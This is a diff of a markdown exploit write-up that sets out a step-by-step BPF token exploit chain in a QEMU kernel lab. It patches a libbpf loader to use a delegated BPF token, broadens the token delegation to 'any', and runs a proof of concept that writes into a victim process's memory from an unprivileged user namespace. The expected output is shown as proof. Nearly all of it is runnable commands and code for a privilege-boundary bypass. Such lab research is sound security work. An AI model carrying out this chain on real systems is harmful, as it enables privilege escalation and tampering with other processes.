@@ -427,34 +427,129 @@ BUF=BPFOKAAAAAAAAAAA
 
 ### Exploit chain:
 
-# BPF Token Exec Test
+## 1. Exit QEMU
  
-Then on your host:
+I press:
+ 
+```
+Ctrl-a x
+```
+ 
+---
+ 
+## 2. Mount Rootfs On Host
  
 ```bash
 cd ~/kernel-lab/full-linux
 sudo mount -o loop ~/kernel-lab/rootfs.ext4 ~/kernel-lab/mnt
+sudo mkdir -p ~/kernel-lab/mnt/src/linux
+sudo mount --bind ~/kernel-lab/full-linux ~/kernel-lab/mnt/src/linux
+```
  
+---
+ 
+## 3. Install Guest Build Tools
+ 
+```bash
 sudo chroot ~/kernel-lab/mnt /bin/bash -c \
-  "apt update && apt install -y build-essential binutils"
+  "apt update && apt install -y build-essential binutils libelf-dev zlib1g-dev"
+```
  
+---
+ 
+## 4. Build Current In-Tree libbpf
+ 
+```bash
+sudo chroot ~/kernel-lab/mnt /bin/bash -c \
+  "make -C /src/linux/tools/lib/bpf -j2"
+```
+ 
+---
+ 
+## 5. Force Loader To Use Token Path
+ 
+I patch `/root/poc/tw_write_user.c` inside the guest rootfs:
+ 
+```bash
+sudo grep -q 'bpf_token_path' ~/kernel-lab/mnt/root/poc/tw_write_user.c || \
+sudo perl -0pi -e 's/skel = tw_write_bpf__open\(\);/const char *token_path = getenv("LIBBPF_BPF_TOKEN_PATH");\n    if (token_path && token_path[0]) {\n        LIBBPF_OPTS(bpf_object_open_opts, opts,\n            .bpf_token_path = token_path,\n        );\n        skel = tw_write_bpf__open_opts(\&opts);\n    } else {\n        skel = tw_write_bpf__open();\n    }/' \
+  ~/kernel-lab/mnt/root/poc/tw_write_user.c
+```
+ 
+I then recompile the loader against the new in-tree libbpf, not Debian libbpf:
+ 
+```bash
+sudo chroot ~/kernel-lab/mnt /bin/bash -c \
+  "gcc -O2 -g -Wall /root/poc/tw_write_user.c -o /root/tw_write_user \
+   -I/src/linux/tools/lib -I/src/linux/tools/lib/bpf \
+   /src/linux/tools/lib/bpf/libbpf.a -lelf -lz"
+```
+ 
+---
+ 
+## 6. Fix Wrapper Delegation
+ 
+I make the token delegation broad enough for libbpf's internal probe:
+ 
+```bash
+sudo sed -i 's/"array"/"any"/' ~/kernel-lab/mnt/root/bpf_token_exec.c
+sudo sed -i 's/"tracing"/"any"/' ~/kernel-lab/mnt/root/bpf_token_exec.c
+sudo sed -i 's/"trace_raw_tp"/"any"/' ~/kernel-lab/mnt/root/bpf_token_exec.c
+```
+ 
+I add the `memlock` rlimit setup:
+ 
+```bash
+sudo grep -q 'sys/resource.h' ~/kernel-lab/mnt/root/bpf_token_exec.c || \
+sudo sed -i '/#include <sys\/wait.h>/a #include <sys/resource.h>' \
+  ~/kernel-lab/mnt/root/bpf_token_exec.c
+ 
+sudo grep -q 'RLIMIT_MEMLOCK' ~/kernel-lab/mnt/root/bpf_token_exec.c || \
+sudo sed -i '/if (argc < 6)/i \    struct rlimit rlim = { RLIM_INFINITY, RLIM_INFINITY };\n    setrlimit(RLIMIT_MEMLOCK, \&rlim);' \
+  ~/kernel-lab/mnt/root/bpf_token_exec.c
+```
+ 
+I then recompile cleanly:
+ 
+```bash
 sudo chroot ~/kernel-lab/mnt /bin/bash -c \
   "gcc -O2 -Wall /root/bpf_token_exec.c -o /root/bpf_token_exec"
+```
  
+I unmount:
+ 
+```bash
 sudo sync
+sudo umount ~/kernel-lab/mnt/src/linux
 sudo umount ~/kernel-lab/mnt
 ```
  
-Then boot QEMU again and verify:
+---
+ 
+## 7. Boot QEMU Again
  
 ```bash
-ls -l /root/bpf_token_exec
+qemu-system-x86_64 \
+  -m 4096 \
+  -smp 2 \
+  -accel tcg \
+  -kernel arch/x86/boot/bzImage \
+  -drive file=$HOME/kernel-lab/rootfs.ext4,format=raw,if=virtio \
+  -append "console=ttyS0 root=/dev/vda rw init=/init tsc=unstable" \
+  -nographic \
+  -no-reboot
 ```
  
-Also restart the victim before the token test, because your current victim is already modified:
+---
+ 
+## 8. Run Clean Test Inside QEMU
+ 
+I do not run `/tmp/victim.log` as a command. I run `/root/victim`:
  
 ```bash
 killall victim 2>/dev/null || true
+rm -f /tmp/victim.log
+ 
 /root/victim > /tmp/victim.log 2>&1 &
 sleep 2
  
@@ -469,13 +564,7 @@ echo "PID=$PID ADDR=$ADDR"
 tail -n 5 /tmp/victim.log
 ```
  
-You want to see fresh As before testing:
- 
-```text
-BUF=AAAAAAAAAAAAAAAA
-```
- 
-Then run the token proof:
+I then run the token proof:
  
 ```bash
 /root/bpf_token_exec 1000 1000 /tmp/bpf-token /tmp/tw_write_user "$PID" "$ADDR"
@@ -484,12 +573,34 @@ sleep 3
 tail -n 10 /tmp/victim.log
 ```
  
-If it succeeds, the key evidence will be:
+---
+ 
+## Expected Success Output
+ 
+Success shows both of the following.
+ 
+The uid_map confirming token-delegated user namespace:
  
 ```text
 [child] uid_map:          0       1000          1
-loader pid=... target pid=... target addr=...
+```
+ 
+And the write primitive working from that context:
+ 
+```text
 scheduled=... ran=... err=0
 BUF=BPFOKAAAAAAAAAAA
 ```
+ 
+This proves the `BPFOK` write works from a token-delegated user-namespace loader, not init-namespace root.
 <img width="736" height="408" alt="image" src="https://github.com/user-attachments/assets/bf2e3bd9-76f0-41a9-934e-705b19fd65a4" />
+
+---
+<img width="1078" height="407" alt="image" src="https://github.com/user-attachments/assets/37af812d-8fcc-4a99-a319-dd298bbc5a68" />
+
+<img width="835" height="150" alt="image" src="https://github.com/user-attachments/assets/153b8c2d-5011-4795-846a-75bf82ffc332" />
+
+<img width="881" height="293" alt="image" src="https://github.com/user-attachments/assets/d15cf599-24aa-4bba-bc44-17a897b837b9" />
+
+
+
